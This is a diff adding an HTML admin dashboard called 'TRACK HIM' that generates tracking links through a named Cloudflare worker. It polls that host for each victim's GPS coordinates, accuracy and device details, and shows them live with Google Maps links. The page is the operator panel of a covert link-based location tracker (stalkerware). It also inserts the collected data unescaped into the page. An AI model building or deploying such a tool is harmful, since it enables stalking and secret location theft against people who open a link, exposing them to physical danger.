@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TRACK HIM • Admin</title>
+
+<style>
+:root{
+  --blue:#2563eb;
+  --bg:#f8fafc;
+  --card:#ffffff;
+  --border:#e2e8f0;
+}
+
+body{
+  margin:0;
+  font-family:system-ui,-apple-system;
+  background:var(--bg);
+  color:#0f172a;
+}
+
+header{
+  padding:20px;
+  text-align:center;
+}
+header h1{margin:0;font-size:24px}
+header span{font-size:13px;color:var(--blue)}
+
+.container{
+  max-width:900px;
+  margin:auto;
+  padding:16px;
+}
+
+.card{
+  background:var(--card);
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:16px;
+  margin-bottom:16px;
+}
+
+button{
+  background:var(--blue);
+  color:#fff;
+  border:none;
+  padding:12px 18px;
+  border-radius:10px;
+  font-size:15px;
+  cursor:pointer;
+}
+
+input{
+  width:100%;
+  padding:10px;
+  margin-top:10px;
+  border-radius:8px;
+  border:1px solid var(--border);
+}
+
+.user{
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:14px;
+  margin-bottom:12px;
+  background:#fff;
+}
+
+.user small{color:#64748b}
+.user a{color:var(--blue);text-decoration:none}
+
+.alert{
+  margin-top:10px;
+  padding:10px;
+  background:#dbeafe;
+  border-radius:8px;
+  color:#1e40af;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h1>TRACK HIM</h1>
+  <span>powered by Cyber Wolf</span>
+</header>
+
+<div class="container">
+
+<div class="card">
+  <button onclick="generate()">Generate Tracking Link</button>
+  <input id="link" readonly style="display:none">
+  <div id="alert"></div>
+</div>
+
+<div class="card">
+  <h3>Live Users</h3>
+  <div id="users">No users yet…</div>
+</div>
+
+</div>
+
+<script>
+const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev/";
+const seen = new Set();
+
+function generate(){
+ fetch(API+"/create-link",{method:"POST"})
+ .then(r=>r.json())
+ .then(d=>{
+   link.style.display="block";
+   link.value = API + d.link;
+ });
+}
+
+async function load(){
+ const r = await fetch(API+"/get-all-locations");
+ const data = await r.json();
+ users.innerHTML="";
+
+ for(const t in data){
+  const u = data[t];
+
+  if(!seen.has(t)){
+    alert.innerHTML="<div class='alert'>Link opened</div>";
+    setTimeout(()=>alert.innerHTML="",3000);
+    seen.add(t);
+  }
+
+  users.innerHTML += `
+    <div class="user">
+      <small>Token</small><br><b>${t}</b><br><br>
+
+      <small>Coordinates</small><br>
+      ${u.lat || "—"}, ${u.lng || "—"}<br><br>
+
+      <small>Accuracy</small><br>
+      ${u.acc || "—"} meters<br><br>
+
+      <small>Device</small><br>
+      ${u.device?.platform || ""}<br>
+      ${u.device?.screen || ""}<br>
+      ${u.device?.language || ""}<br><br>
+
+      <a target="_blank"
+       href="https://www.google.com/maps?q=${u.lat},${u.lng}">
+       View on Google Maps
+      </a>
+    </div>`;
+ }
+}
+
+setInterval(load,2000);
+</script>
+
+</body>
+</html>
